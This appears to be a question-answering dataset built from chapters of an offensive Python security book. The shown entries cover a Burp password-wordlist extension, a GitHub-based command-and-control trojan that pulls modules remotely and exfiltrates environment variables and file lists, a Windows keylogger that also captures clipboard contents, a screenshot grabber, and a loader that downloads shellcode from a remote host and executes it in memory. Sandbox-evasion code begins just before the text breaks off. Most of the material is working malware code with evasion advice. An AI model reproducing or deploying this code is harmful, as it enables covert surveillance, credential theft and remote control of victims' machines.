sorted(self.wordlist):\nfor password in self.mangle(word):\nprint password\nreturn\nVery nice! The method takes a base word and turns it into a\nmangle\nnumber of password guesses based on some common password\ncreation strategies. In this simple example, we create a list of\nsuffixes to tack on the end of the base word, including the current\nyear 1. Next, we loop through each suffix and add it to the base word\n2 to create a unique password attempt. We do another loop with a\ncapitalized version of the base word for good measure. In the\nmethod, we print a “John the Ripper”–style\ndisplay_wordlist\ncomment 3 to remind us which sites we used to generate this word\nlist. Then we mangle each base word and print the results. Time to\ntake this baby for a spin.\nKicking the Tires\nClick the Extender tab in Burp, click the Add button, and then use\nthe same procedure we used for our previous extensions to get the\nWordlist extension working.\nIn the Dashboard tab, select New live task, as shown in Figure 6-\n12.\nFigure 6-12: Starting a live passive scan with Burp\nWhen the dialog appears, choose Add all links observed in\ntraffic, as shown in Figure 6-13, and click OK.\nFigure 6-13: Configuring the live passive scan with Burp\nAfter you’ve configured the scan, browse to\nhttp://testphp.vulnweb.com/ to run it. Once Burp has visited all the\nlinks on the target site, select all the requests in the top-right pane of\nthe Target tab, right-click them to bring up the context menu, and\nselect Create Wordlist, as shown in Figure 6-14.\nFigure 6-14: Sending the requests to the BHP Wordlist extension\nNow check the Output tab of the extension. In practice, we’d save\nits output to a file, but for demonstration purposes we display the\nword list in Burp, as shown in Figure 6-15.\nYou can now feed this list back into Burp Intruder to perform the\nactual password-guessing attack.\nFigure 6-15: A password list based on content from the target website\nWe’ve now demonstrated a small subset of the Burp API by\ngenerating our own attack payloads, as well as building extensions\nthat interact with the Burp UI. During a penetration test, you’ll often\nencounter specific problems or automation needs, and the Burp\nExtender API provides an excellent interface to code your way out of\na corner, or at least save you from having to continually copy and\npaste captured data from Burp to another tool.",
    "question": "What are the three main extensions described in the text and their purposes?",
    "summary": "This text explains how to use Burp Suite's extension API to create custom tools for web application testing. It details three extensions: a fuzzer for testing web requests, a tool that uses the Bing API to find virtual hosts and subdomains on a target IP, and a word list generator that extracts words from website content for password guessing. The extensions are built using Python and Jython, and the text walks through the setup process and code implementation for each."
  },
  {
    "start": 60,
    "end": 66,
    "text": "7\nGITHUB COMMAND AND CONTROL\nSuppose you’ve compromised a\nmachine. Now you want it to\nautomatically perform tasks and report\nits findings back to you. In this chapter,\nwe’ll create a trojan framework that will\nappear innocuous on the remote\nmachine, but we’ll be able to assign it all sorts of\nnefarious tasks.\nOne of the most challenging aspects of creating a solid trojan\nframework is figuring out how to control, update, and receive data\nfrom your implants. Crucially, you’ll need a relatively universal way to\npush code to your remote trojans. For one thing, this flexibility will let\nyou perform different tasks on each system. Also, you may\nsometimes need your trojans to selectively run code for certain\ntarget operating systems but not others.\nAlthough hackers have devised lots of creative command-and-\ncontrol methods over the years, relying on technologies such as the\nInternet Relay Chat (IRC) protocol and even Twitter, we’ll try a\nservice actually designed for code. We’ll use GitHub as a way to\nstore configuration information for our implants and as a means to\nexfiltrate data from victim systems. Also, we’ll host any modules the\nimplant needs to execute tasks on GitHub. In setting this all up, we’ll\nhack Python’s native library-import mechanism so that as you create\nnew trojan modules, your implants can automatically retrieve them,\nand any dependent libraries, directly from your repo.\nLeveraging GitHub for these tasks can be a clever strategy: your\ntraffic to GitHub will be encrypted over Secure Sockets Layer (SSL),\nand we, the authors, have seen very few enterprises actively block\nGitHub itself. We’ll use a private repo so that prying eyes can’t see\nwhat we’re doing. Once you’ve coded the capabilities into the trojan,\nyou could theoretically convert it to a binary and drop it on a\ncompromised machine so it runs indefinitely. Then you could use the\nGitHub repository to tell it what to do and find what it has discovered.\nSetting Up a GitHub Account\nIf you don’t have a GitHub account, head over to https://github.com/,\nsign up, and create a new repository called bhptrojan. Next, install\nthe Python GitHub API library (https://pypi.org/project/github3.py/) so\nthat you can automate your interaction with the repo:\npip install github3.py\nNow let’s create a basic structure for our repo. Enter the following\non the command line:\n$ mkdir bhptrojan\n$ cd bhptrojan\n$ git init\n$ mkdir modules\n$ mkdir config\n$ mkdir data\n$ touch .gitignore\n$ git add .\n$ git commit -m \"Adds repo structure for trojan.\"\n$ git remote add origin\nhttps://github.com/<yourusername>/bhptrojan.git\n$ git push origin master\nHere, we’ve created the initial structure for the repo. The config\ndirectory holds unique configuration files for each trojan. As you\ndeploy trojans, you want each one to perform different tasks, so\neach trojan will check a separate configuration file. The modules\ndirectory contains any modular code that the trojan should pick up\nand then execute. We’ll implement a special import hack to allow our\ntrojan to import libraries directly from our GitHub repo. This remote\nload capability will also allow you to stash third-party libraries in\nGitHub so you don’t have to continually recompile your trojan every\ntime you want to add new functionality or dependencies. The data\ndirectory is where the trojan will check in any collected data.\nYou can create a personal access token on the GitHub site and\nuse it in place of a password when performing Git operations over\nHTTPS with the API. The token should provide our trojan with both\nread and write permissions, since it will need to both read its\nconfiguration and write its output. Follow the instructions on the\nGitHub site (https://docs.github.com/en/github/authenticating-to-\ngithub/) to create the token and save the token string in a local file\ncalled mytoken.txt. Then, add mytoken.txt to the .gitignore file so you\ndon’t accidentally push your credentials to the repository.\nNow let’s create some simple modules and a sample configuration\nfile.\nCreating Modules\nIn later chapters, you will do nasty business with your trojans, such\nas logging keystrokes and taking screenshots. But to start, let’s\ncreate some simple modules that we can easily test and deploy.\nOpen a new file in the modules directory, name it dirlister.py, and\nenter the following code:\nimport os\ndef run(**args):\nprint(\"[*] In dirlister module.\")\nfiles = os.listdir(\".\")\nreturn str(files)\nThis little snippet of code defines a function that lists all of the\nrun\nfiles in the current directory and returns that list as a string. Each\nmodule you develop should expose a function that takes a\nrun\nvariable number of arguments. This enables you to load each\nmodule in the same way, but still lets you customize the\nconfiguration files to pass different arguments to the modules if you\ndesire.\nNow let’s create another module in a file called environment.py:\nimport os\ndef run(**args):\nprint(\"[*] In environment module.\")\nreturn os.environ\nThis module simply retrieves any environment variables that are\nset on the remote machine on which the trojan is executing.\nNow let’s push this code to our GitHub repo so that our trojan can\nuse it. From the command line, enter the following code from your\nmain repository directory:\n$ git add .\n$ git commit -m \"Adds new modules\"\n$ git push origin master\nUsername: ********\nPassword: ********\nYou should see your code getting pushed to your GitHub repo; feel\nfree to log in to your account and double-check! This is exactly how\nyou can continue to develop code in the future. We’ll leave the\nintegration of more complex modules to you as a homework\nassignment.\nTo assess any modules you create, push them to GitHub and then\nenable them in a configuration file for your local version of the trojan.\nThis way, you could test them on a virtual machine (VM) or host\nhardware that you control before allowing one of your remote trojans\nto pick up the code and use it.\nConfiguring the Trojan\nWe’ll want to task our trojan with performing certain actions. This\nmeans we need a way to tell it what actions to perform and what\nmodules are responsible for performing them. Using a configuration\nfile gives us that level of control. It also enables us to effectively put\na trojan to sleep (by not giving it any tasks) should we choose to. For\nthis system to work, each trojan you deploy should have a unique ID.\nThat way, you’ll be able to sort any retrieved data based on these\nIDs and control which trojans performs certain tasks.\nWe’ll configure the trojan to look in the config directory for\nTROJANID.json, which will return a simple JSON document that we\ncan parse out, convert to a Python dictionary, and then use to inform\nour trojan of which tasks to perform. The JSON format makes it easy\nto change configuration options as well. Move into your config\ndirectory and create a file called abc.json with the following content:\n[\n{\n\"module\" : \"dirlister\"\n},\n{\n\"module\" : \"environment\"\n}\n]\nThis is just a simple list of modules that the remote trojan should\nrun. Later, you’ll see how we read this JSON document and then\niterate over each option to load those modules.\nAs you brainstorm module ideas, you may find that it’s useful to\ninclude additional configuration options, such as an execution\nduration, the number of times to run the module, or arguments to be\npassed to the module. You could also add multiple methods of\nexfiltrating data, as we show you in Chapter 9.\nDrop into a command line and issue the following commands from\nyour main repo directory:\n$ git add .\n$ git commit -m \"Adds simple configuration.\"\n$ git push origin master\nUsername: ********\nPassword: ********\nNow that you have your configuration files and some simple\nmodules to run, let’s start building the main trojan.\nBuilding a GitHub-Aware Trojan\nThe main trojan will retrieve configuration options and code to run\nfrom GitHub. Let’s start by writing the functions that connect and\nauthenticate to the GitHub API and then communicate with it. Open\na new file called git_trojan.py and enter the following:\nimport base64\nimport github3\nimport importlib\nimport json\nimport random\nimport sys\nimport threading\nimport time\nfrom datetime import datetime\nThis simple setup code contains the necessary imports, which\nshould keep our overall trojan size relatively small when compiled.\nWe say relatively because most compiled Python binaries using\nare around 7MB. (You can check out here:\npyinstaller pyinstaller\nhttps://www.pyinstaller.org/downloads.html). We’ll drop this binary on\nthe compromised machine.\nIf you were to explode this technique to build a full botnet (a\nnetwork of many such implants), you’d want the ability to\nautomatically generate trojans, set their ID, create a configuration file\nthat’s pushed to GitHub, and compile the trojan into an executable.\nWe won’t build a botnet today, though; we’ll let your imagination do\nthe work.\nNow let’s put the relevant GitHub code in place:\n1\ndef github_connect():\nwith open('mytoken.txt') as f:\ntoken = f.read()\nuser = 'tiarno'\nsess = github3.login(token=token)\nreturn sess.repository(user, 'bhptrojan')\n2\ndef get_file_contents(dirname, module_name, repo):\nreturn\nrepo.file_contents(f'{dirname}/{module_name}').content\nThese two functions handle the interaction with the GitHub\nrepository. The function reads the token created on\ngithub_connect\nGitHub 1. When you created the token, you wrote it to a file called\nmytoken.txt. Now we read the token from that file and return a\nconnection to the GitHub repository. You may want to create different\ntokens for different trojans so you can control what each trojan can\naccess in your repository. That way, if victims catch your trojan, they\ncan’t come along and delete all of your retrieved data.\nThe function receives the directory name,\nget_file_contents\nmodule name, and repository connection and returns the contents of\nthe specified module 2. This function is responsible for grabbing files\nfrom the remote repo and reading the contents in locally. We’ll use it\nfor reading both configuration options and the module source code.\nNow we will create a class that performs the essential\nTrojan\ntrojaning tasks:\nclass Trojan:\n1\ndef __init__(self, id):\nself.id = id\nself.config_file = f'{id}.json'\n2\nself.data_path = f'data/{id}/'\n3\nself.repo = github_connect()\nWhen we initialize the Trojan object 1, we assign its configuration\ninformation and the data path where the trojan will write its output\nfiles 2, and we make the connection to the repository 3. Now we’ll\nadd the methods we’ll need to communicate with it:\n1\ndef get_config(self):\nconfig_json = get_file_contents(\n'config', self.config_file,\nself.repo\n)\nconfig = json.loads(base64.b64decode(config_json))\nfor task in config:\nif task['module'] not in sys.modules:\n2\nexec(\"import %s\" % task['module'])\nreturn config\n3\ndef module_runner(self, module):\nresult = sys.modules[module].run()\nself.store_module_result(result)\n4\ndef store_module_result(self, data):\nmessage = datetime.now().isoformat()\nremote_path = f'data/{self.id}/{message}.data'\nbindata = bytes('%r' % data, 'utf-8')\nself.repo.create_file(\nremote_path, message,\nbase64.b64encode(bindata)\n)\n5\ndef run(self):\nwhile True:\nconfig = self.get_config()\nfor task in config:\nthread = threading.Thread(\ntarget=self.module_runner,\nargs=(task['module'],))\nthread.start()\ntime.sleep(random.randint(1, 10))\n6\ntime.sleep(random.randint(30*60, 3*60*60))\nThe method 1 retrieves the remote configuration\nget_config\ndocument from the repo so that your trojan knows which modules to\nrun. The call brings the module content into the trojan object 2.\nexec\nThe method calls the function of the module just\nmodule_runner run\nimported 3. We’ll go into more detail on how it gets called in the next\nsection. And the method 4 creates a file whose\nstore_module_result\nname includes the current date and time and then saves its output\ninto that file. The trojan will use these three methods to push any\ndata collected from the target machine to GitHub.\nIn the method 5, we start executing these tasks. The first step\nrun\nis to grab the configuration file from the repo. Then we kick off the\nmodule in its own thread. While in the method, we call\nmodule_runner\nthe module’s function to run its code. When it’s done running, it\nrun\nshould output a string that we then push to our repo.\nWhen it finishes a task, the trojan will sleep for a random amount\nof time in an attempt to foil any network-pattern analysis 6. You\ncould, of course, create a bunch of traffic to google.com, or any\nnumber of other sites that appear benign, in an attempt to disguise\nwhat your trojan is up to.\nNow let’s create an import hack to import remote files from the\nGitHub repo.\nHacking Python’s import Functionality\nIf you’ve made it this far in the book, you know that we use Python’s\nfunctionality to copy external libraries into our programs so\nimport\nwe can use their code. We want to be able to do the same thing for\nour trojan. But since we’re controlling a remote machine, we may\nwant to use a package not available on that machine, and there’s no\neasy way to install packages remotely. Beyond that, we also want to\nmake sure that if we pull in a dependency, such as Scapy, our trojan\nmakes that module available to all other modules that we pull in.\nPython allows us to customize how it imports modules; if it can’t\nfind a module locally, it will call an import class we define, which will\nallow us to remotely retrieve the library from our repo. We’ll have to\nadd our custom class to the list. Let’s create this class\nsys.meta_path\nnow by adding the following code:\nclass GitImporter:\ndef __init__(self):\nself.current_module_code = \"\"\ndef find_module(self, name, path=None):\nprint(\"[*] Attempting to retrieve %s\" % name)\nself.repo = github_connect()\nnew_library = get_file_contents('modules',\nf'{name}.py', self.repo)\nif new_library is not None:\n1\nself.current_module_code =\nbase64.b64decode(new_library)\nreturn self\ndef load_module(self, name):\nspec = importlib.util.spec_from_loader(name,\nloader=None,\norigin=self.repo.git_url)\n2\nnew_module = importlib.util.module_from_spec(spec)\nexec(self.current_module_code, new_module.__dict__)\n3\nsys.modules[spec.name] = new_module\nreturn new_module\nEvery time the interpreter attempts to load a module that isn’t\navailable, it will use this class. First, the\nGitImporter find_module\nmethod attempts to locate the module. We pass this call to our\nremote file loader. If we can locate the file in our repo, we base64-\ndecode the code and store it in our class 1. (GitHub will give us\nbase64-encoded data.) By returning , we indicate to the Python\nself\ninterpreter that we found the module and that it can call the\nmethod to actually load it. We use the native\nload_module importlib\nmodule to first create a new blank module object 2 and then shovel\nthe code we retrieved from GitHub into it. The last step is to insert\nthe newly created module into the list 3 so that it’s\nsys.modules\npicked up by any future calls.\nimport\nNow let’s put the finishing touches on the trojan:\nif __name__ == '__main__':\nsys.meta_path.append(GitImporter())\ntrojan = Trojan('abc')\ntrojan.run()\nIn the block, we put into the\n__main__ GitImporter sys.meta_path\nlist, create the object, and call its method.\nTrojan run\nNow let’s take it for a spin!\nKicking the Tires\nAll right! Let’s test this thing out by running it from the command line:\nWARNING\nIf you have sensitive information in files or environment\nvariables, remember that without a private repository, that\ninformation is going to go up to GitHub for the whole world to\nsee. Don’t say we didn’t warn you. Of course, you could\nprotect yourself using the encryption techniques you’ll learn in\nChapter 9.\n$ python git_trojan.py\n[*] Attempting to retrieve dirlister\n[*] Attempting to retrieve environment\n[*] In dirlister module\n[*] In environment module.\nPerfect. It connected to the repository, retrieved the configuration\nfile, pulled in the two modules we set in the configuration file, and ran\nthem.\nNow from your trojan directory, enter the following on the\ncommand line:\n$ git pull origin master\nFrom https://github.com/tiarno/bhptrojan\n6256823..8024199 master -> origin/master\nUpdating 6256823..8024199\nFast-forward\ndata/abc/2020-03-29T11:29:19.475325.data | 1 +\ndata/abc/2020-03-29T11:29:24.479408.data | 1 +\ndata/abc/2020-03-29T11:40:27.694291.data | 1 +\ndata/abc/2020-03-29T11:40:33.696249.data | 1 +\n4 files changed, 4 insertions(+)\ncreate mode 100644 data/abc/2020-03-29T11:29:19.475325.data\ncreate mode 100644 data/abc/2020-03-29T11:29:24.479408.data\ncreate mode 100644 data/abc/2020-03-29T11:40:27.694291.data\ncreate mode 100644 data/abc/2020-03-29T11:40:33.696249.data\nAwesome! The trojan checked in the results of the two running\nmodules.\nYou could make a number of improvements and enhancements to\nthis core command-and-control technique. Encrypting all your\nmodules, configuration, and exfiltrated data would be a good start.\nYou’d also need to automate the process of pulling down data,\nupdating configuration files, and rolling out new trojans if you were\ngoing to infect systems on a massive scale. As you add more and\nmore functionality, you’ll also need to extend how Python loads\ndynamic and compiled libraries.\nFor now, let’s work on creating some standalone trojan tasks, and\nwe’ll leave it to you to integrate them into your new GitHub trojan.",
    "question": "How can a trojan framework use GitHub to store configuration information, retrieve modules, and exfiltrate data from compromised systems?",
    "summary": "This text explains how to create a GitHub-based trojan framework that can automatically perform tasks on a compromised machine and report findings back to the attacker. The framework uses GitHub to store modules and configuration files, allowing for easy updates and remote execution. By hacking Python's import mechanism, the trojan can retrieve and run code from the GitHub repository, enabling it to access and exfiltrate data from the victim system."
  },
  {
    "start": 67,
    "end": 73,
    "text": "8\nCOMMON TROJANING TASKS ON\nWINDOWS\nWhen you deploy a trojan, you may\nwant to perform a few common tasks\nwith it: grab keystrokes, take\nscreenshots, and execute shellcode to\nprovide an interactive session to tools\nlike CANVAS or Metasploit. This\nchapter focuses on performing these tasks on\nWindows systems. We’ll wrap things up with some\nsandbox detection techniques to determine if we are\nrunning within an antivirus or forensics sandbox.\nThese modules will be easy to modify and will work\nwithin the trojan framework developed in Chapter 7.\nIn later chapters, we’ll explore privilege escalation\ntechniques that you can deploy with your trojan.\nEach technique comes with its own challenges and\nprobability of being caught, either by the end user or\nan antivirus solution.\nWe recommend that you carefully model your target after you’ve\nimplanted your trojan so that you can test the modules in your lab\nbefore trying them on a live target. Let’s get started by creating a\nsimple keylogger.\nKeylogging for Fun and Keystrokes\nKeylogging, the use of a concealed program to record consecutive\nkeystrokes, is one of the oldest tricks in the book, and it’s still\nemployed with various levels of stealth today. Attackers still use it\nbecause it’s extremely effective at capturing sensitive information\nsuch as credentials or conversations.\nAn excellent Python library named enables us to easily\nPyWinHook\ntrap all keyboard events (https://pypi.org/project/pyWinhook/).\nPyWinHook is a fork of the original PyHook library and is updated to\nsupport Python 3. It takes advantage of the native Windows function\n, which allows us to install a user-defined function\nSetWindowsHookEx\nto be called for certain Windows events. By registering a hook for\nkeyboard events, we’ll be able to trap all of the keypresses that a\ntarget issues. On top of this, we’ll want to know exactly what process\nthey are executing these keystrokes against so that we can\ndetermine when usernames, passwords, or other tidbits of useful\ninformation are entered.\nPyWinHook takes care of all of the low-level programming for us,\nwhich leaves the core logic of the keystroke logger up to us. Let’s\ncrack open keylogger.py and drop in some of the plumbing:\nfrom ctypes import byref, create_string_buffer, c_ulong,\nwindll\nfrom io import StringIO\nimport os\nimport pythoncom\nimport pyWinhook as pyHook\nimport sys\nimport time\nimport win32clipboard\nTIMEOUT = 60*10\nclass KeyLogger:\ndef __init__(self):\nself.current_window = None\ndef get_current_process(self):\n1\nhwnd = windll.user32.GetForegroundWindow()\npid = c_ulong(0)\n2\nwindll.user32.GetWindowThreadProcessId(hwnd,\nbyref(pid))\nprocess_id = f'{pid.value}'\nexecutable = create_string_buffer(512)\n3\nh_process = windll.kernel32.OpenProcess(0x400|0x10,\nFalse, pid)\n4\nwindll.psapi.GetModuleBaseNameA(\nh_process, None, byref(executable), 512)\nwindow_title = create_string_buffer(512)\n5\nwindll.user32.GetWindowTextA(hwnd,\nbyref(window_title), 512)\ntry:\nself.current_window =\nwindow_title.value.decode()\nexcept UnicodeDecodeError as e:\nprint(f'{e}: window name unknown')\n6\nprint('\\n', process_id,\nexecutable.value.decode(),\nself.current_window)\nwindll.kernel32.CloseHandle(hwnd)\nwindll.kernel32.CloseHandle(h_process)\nAll right! We define a constant, , create a new class,\nTIMEOUT\n, and write the method that will\nKeyLogger get_current_process\ncapture the active window and its associated process ID. Within that\nmethod, we first call 1, which returns a handle to\nGetForeGroundWindow\nthe active window on the target’s desktop. Next we pass that handle\nto the 2 function to retrieve the window’s\nGetWindowThreadProcessId\nprocess ID. We then open the process 3, and using the resulting\nprocess handle, we find the actual executable name 4 of the\nprocess. The final step is to grab the full text of the window’s title bar\nusing the 5 function. At the end of this helper method,\nGetWindowTextA\nwe output all of the information 6 in a nice header so that you can\nclearly see which keystrokes went with which process and window.\nNow let’s put the meat of our keystroke logger in place to finish it off:\ndef mykeystroke(self, event):\n1\nif event.WindowName != self.current_window:\nself.get_current_process()\n2\nif 32 < event.Ascii < 127:\nprint(chr(event.Ascii), end='')\nelse:\n3\nif event.Key == 'V':\nwin32clipboard.OpenClipboard()\nvalue = win32clipboard.GetClipboardData()\nwin32clipboard.CloseClipboard()\nprint(f'[PASTE] - {value}')\nelse:\nprint(f'{event.Key}')\nreturn True\ndef run():\nsave_stdout = sys.stdout\nsys.stdout = StringIO()\nkl = KeyLogger()\n4\nhm = pyHook.HookManager()\n5\nhm.KeyDown = kl.mykeystroke\n6\nhm.HookKeyboard()\nwhile time.thread_time() < TIMEOUT:\npythoncom.PumpWaitingMessages()\nlog = sys.stdout.getvalue()\nsys.stdout = save_stdout\nreturn log\nif __name__ == '__main__':\nprint(run())\nprint('done.')\nLet’s break this down, starting with the function. In Chapter 7,\nrun\nwe created modules that a compromised target could run. Each\nmodule had an entry-point function called , so we write this\nrun\nkeylogger to follow the same pattern and we can use it in the same\nway. The function in the command-and-control system from\nrun\nChapter 7 takes no arguments and returns its output. To match that\nbehavior here, we temporarily switch to a file-like object,\nstdout\n. Now, everything written to will go to that object,\nStringIO stdout\nwhich we will query later.\nAfter switching , we create the object and define\nstdout KeyLogger\nthe PyWinHook 4. Next, we bind the event to the\nHookManager KeyDown\ncallback method 5. We then instruct\nKeyLogger mykeystroke\nPyWinHook to hook all keypresses 6 and continue execution until we\ntime out. Whenever the target presses a key on the keyboard, our\nmethod is called with an event object as its parameter.\nmykeystroke\nThe first thing we do in is check if the user has changed\nmykeystroke\nwindows 1, and if so, we acquire the new window’s name and\nprocess information. We then look at the keystroke that was issued\n2, and if it falls within the ASCII-printable range, we simply print it\nout. If it’s a modifier (such as the SHIFT, CTRL, or ALT key) or any\nother nonstandard key, we grab the key name from the event object.\nWe also check if the user is performing a paste operation 3, and if\nso, we dump the contents of the clipboard. The callback function\nwraps up by returning to allow the next hook in the chain—if\nTrue\nthere is one—to process the event. Let’s take it for a spin!\nKicking the Tires\nIt’s easy to test our keylogger. Simply run it and then start using\nWindows normally. Try using your web browser, calculator, or any\nother application and then view the results in your terminal:\nC:\\Users\\tim>python keylogger.py\n6852 WindowsTerminal.exe Windows PowerShell\nReturn\ntest\nReturn\n18149 firefox.exe Mozilla Firefox\nnostarch.com\nReturn\n5116 cmd.exe Command Prompt\ncalc\nReturn\n3004 ApplicationFrameHost.exe Calculator\n1 Lshift\n+1\nReturn\nYou can see that we typed the word test into the main window\nwhere the keylogger script ran. We then fired up Firefox, browsed to\nnostarch.com, and ran some other applications. We can now safely\nsay that we’ve added our keylogger to our bag of trojaning tricks!\nLet’s move on to taking screenshots.\nTaking Screenshots\nMost pieces of malware and penetration testing frameworks include\nthe capability to take screenshots on the remote target. This can\nhelp capture images, video frames, or other sensitive data that you\nmight not see with a packet capture or keylogger. Thankfully, we can\nuse the package to make native calls to the Windows API to\npywin32\ngrab them. Install the package with :\npip\npip install pywin32\nA screenshot grabber will use the Windows Graphics Device\nInterface (GDI) to determine necessary properties, such as the total\nscreen size, and to grab the image. Some screenshot software will\ngrab a picture of only the currently active window or application, but\nwe’ll capture the entire screen. Let’s get started. Crack open\nscreenshotter.py and drop in the following code:\nimport base64\nimport win32api\nimport win32con\nimport win32gui\nimport win32ui\n1\ndef get_dimensions():\nwidth =\nwin32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)\nheight =\nwin32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)\nleft =\nwin32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)\ntop =\nwin32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)\nreturn (width, height, left, top)\ndef screenshot(name='screenshot'):\n2\nhdesktop = win32gui.GetDesktopWindow()\nwidth, height, left, top = get_dimensions()\n3\ndesktop_dc = win32gui.GetWindowDC(hdesktop)\nimg_dc = win32ui.CreateDCFromHandle(desktop_dc)\n4\nmem_dc = img_dc.CreateCompatibleDC()\n5\nscreenshot = win32ui.CreateBitmap()\nscreenshot.CreateCompatibleBitmap(img_dc, width, height)\nmem_dc.SelectObject(screenshot)\n6\nmem_dc.BitBlt((0,0), (width, height),\nimg_dc, (left, top), win32con.SRCCOPY)\n7\nscreenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')\nmem_dc.DeleteDC()\nwin32gui.DeleteObject(screenshot.GetHandle())\n8\ndef run():\nscreenshot()\nwith open('screenshot.bmp') as f:\nimg = f.read()\nreturn img\nif __name__ == '__main__':\nscreenshot()\nLet’s review what this little script does. We acquire a handle to the\nentire desktop 2, which includes the entire viewable area across\nmultiple monitors. We then determine the size of the screen (or\nscreens) 1 so that we know the dimensions required for the\nscreenshot. We create a device context using the 3\nGetWindowDC\nfunction call and pass in a handle to the desktop. (Learn more about\ndevice contexts and GDI programming on the Microsoft Developer\nNetwork [MSDN] at msdn.microsoft.com.) Next, create a memory-\nbased device context 4, where we’ll store our image capture until we\nwrite the bitmap bytes to a file. We then create a bitmap object 5 that\nis set to the device context of our desktop. The call\nSelectObject\nthen sets the memory-based device context to point at the bitmap\nobject that we’re capturing. We use the 6 function to take a\nBitBlt\nbit-for-bit copy of the desktop image and store it in the memory-\nbased context. Think of this as a call for GDI objects. The\nmemcpy\nfinal step is to dump this image to disk 7.\nThis script is easy to test: just run it from the command line and\ncheck the directory for your screenshot.bmp file. You can also\ninclude this script in your GitHub command and control repo, since\nthe function 8 calls the function to create the image\nrun screenshot\nand then reads and returns the file data.\nLet’s move on to executing shellcode.\nPythonic Shellcode Execution\nThere might come a time when you want to be able to interact with\none of your target machines, or use a juicy new exploit module from\nyour favorite penetration testing or exploit framework. This typically,\nthough not always, requires some form of shellcode execution. In\norder to execute raw shellcode without touching the filesystem, we\nneed to create a buffer in memory to hold the shellcode and, using\nthe module, create a function pointer to that memory. Then\nctypes\nwe just call the function.\nIn our case, we’ll use to grab the shellcode from a web server\nurllib\nin base64 format and then execute it. Let’s get started! Open up\nshell_exec.py and enter the following code:\nfrom urllib import request\nimport base64\nimport ctypes\nkernel32 = ctypes.windll.kernel32\ndef get_code(url):\n1\nwith request.urlopen(url) as response:\nshellcode = base64.decodebytes(response.read())\nreturn shellcode\n2\ndef write_memory(buf):\nlength = len(buf)\nkernel32.VirtualAlloc.restype = ctypes.c_void_p\n3\nkernel32.RtlMoveMemory.argtypes = (\nctypes.c_void_p,\nctypes.c_void_p,\nctypes.c_size_t)\n4\nptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)\nkernel32.RtlMoveMemory(ptr, buf, length)\nreturn ptr\ndef run(shellcode):\n5\nbuffer = ctypes.create_string_buffer(shellcode)\nptr = write_memory(buffer)\n6\nshell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))\n7\nshell_func()\nif __name__ == '__main__':\nurl = \"http://192.168.1.203:8100/shellcode.bin\"\nshellcode = get_code(url)\nrun(shellcode)\nHow awesome is that? We kick off our main block by calling the\nfunction to retrieve the base64-encoded shellcode from our\nget_code\nweb server 1. Then we call the function to write the shellcode\nrun\ninto memory and execute it.\nIn the function, we allocate a buffer 5 to hold the shellcode\nrun\nafter we’ve decoded it. Next we call the function to\nwrite_memory\nwrite the buffer into memory 2.\nTo be able to write into memory, we have to allocate the memory\nwe need ( ) and then move the buffer containing the\nVirtualAlloc\nshellcode into that allocated memory ( ). To ensure that\nRtlMoveMemory\nthe shellcode will run whether we’re using 32- or 64-bit Python, we\nmust specify that the result we want back from is a\nVirtualAlloc\npointer, and that the arguments we will give the\nRtlMoveMemory\nfunction are two pointers and a size object. We do this by setting the\nand the 3. Without this\nVirtualAlloc.restype RtlMoveMemory.argtypes\nstep, the width of the memory address returned from\nVirtualAlloc\nwill not match the width that expects.\nRtlMoveMemory\nIn the call to 4, the parameter specifies that the\nVirtualAlloc 0x40\nmemory should have permissions set to execute and read/write\naccess; otherwise, we won’t be able to write and execute the\nshellcode. Then we move the buffer into the allocated memory and\nreturn the pointer to the buffer. Back in the function, the\nrun\nfunction allows us to cast the buffer to act like a function\nctypes.cast\npointer 6 so that we can call our shellcode as we would call any\nnormal Python function. We finish it up by calling the function pointer,\nwhich then causes the shellcode to execute 7.\nKicking the Tires\nYou can hand-code some shellcode or use your favorite pentesting\nframework like CANVAS or Metasploit to generate it for you. As\nCANVAS is a commercial tool, take a look at this tutorial for\ngenerating Metasploit payloads: http://www.offensive-\nsecurity.com/metasploit-unleashed/Generating_Payloads/. We\npicked some Windows x86 shellcode with the Metasploit payload\ngenerator ( in our case). Create the raw shellcode in\nmsfvenom\n/tmp/shellcode.raw on your Linux machine as follows:\nmsfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw\ncmd=calc.exe > shellcode.raw\n$ base64 -w 0 -i shellcode.raw > shellcode.bin\n$ python -m http.server 8100\nServing HTTP on 0.0.0.0 port 8100 ...\nWe create the shellcode with and then base64-encode it\nmsfvenom\nusing the standard Linux command . The next little trick uses\nbase64\nthe module to treat the current working directory (in our\nhttp.server\ncase, /tmp/) as its web root. Any HTTP requests for files on port\n8100 will be served automatically for you. Now drop your\nshell_exec.py script on your Windows box and execute it. You\nshould see the following in your Linux terminal:\n192.168.112.130 - - [12/Jan/2014 21:36:30] \"GET\n/shellcode.bin HTTP/1.1\" 200 -\nThis indicates that your script has retrieved the shellcode from the\nweb server you set up using the module. If all goes well,\nhttp.server\nyou’ll receive a shell back to your framework and will have popped\ncalc.exe, gotten a reverse TCP shell, displayed a message box, or\nwhatever your shellcode was compiled for.\nSandbox Detection\nIncreasingly, antivirus solutions employ some form of sandboxing to\ndetermine the behavior of suspicious specimens. Regardless of\nwhether this sandbox runs on the network perimeter, which is\nbecoming more popular, or on the target machine itself, we must do\nour best to avoid tipping our hand to any defense in place on the\ntarget’s network.\nWe can use a few indicators to try to determine whether our trojan\nis executing within a sandbox. We’ll monitor our target machine for\nrecent user input. Then we’ll add some basic intelligence to look for\nkeystrokes, mouse clicks, and double-clicks. A typical machine has\nmany user interactions on a day in which it has been booted,\nwhereas a sandbox environment usually has no user interaction,\nbecause sandboxes are typically used as an automated malware\nanalysis technique.\nOur script will also try to determine if the sandbox operator is\nsending input repeatedly (for instance, a suspicious, rapid\nsuccession of continuous mouse clicks) in order to try to respond to\nrudimentary sandbox detection methods. Finally, we’ll compare the\nlast time a user interacted with the machine versus how long the\nmachine has been running, which should give us a good idea\nwhether or not we are inside a sandbox.\nWe can then make a determination as to whether we would like to\ncontinue executing. Let’s start working on some sandbox detection\ncode. Open sandbox_detect.py and throw in the following code:\nfrom ctypes import byref, c_uint, c_ulong, sizeof, Structure,\nwindll\nimport random\nimport sys\nimport time\nimport win32api\nclass LASTINPUTINFO(Structure):\nfields_ = [\n('cbSize', 